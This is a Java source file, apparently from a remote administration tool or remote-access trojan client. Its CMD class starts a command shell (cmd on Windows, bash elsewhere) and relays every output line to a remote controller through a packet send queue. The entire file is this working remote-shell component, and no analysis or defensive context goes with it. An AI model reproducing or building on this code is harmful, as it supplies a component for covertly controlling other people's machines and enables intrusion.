package com.redpois0n;
import java.io.BufferedReader;
import java.io.InputStreamReader;

import com.redpois0n.common.OperatingSystem;
import com.redpois0n.packets.in.PacketBuilder;
import com.redpois0n.packets.out.Header;

public class CMD extends Thread {

	public static Process p;

	public void run() {
		String line;
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				p = Runtime.getRuntime().exec("cmd");
			} else {
				ProcessBuilder builder = new ProcessBuilder("/bin/bash");
				builder.redirectErrorStream(true);
				p = builder.start();
			}
			BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
			while ((line = input.readLine()) != null) {
				if (!line.trim().equals("")) {
					Connection.addToSendQueue(new PacketBuilder(Header.COMMAND_PROMPT, line));
				}
			}
			input.close();
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.addToSendQueue(new PacketBuilder(Header.COMMAND_PROMPT, "Error: " + ex.getClass().getSimpleName() + ": " + ex.getMessage()));
		}
	}

}
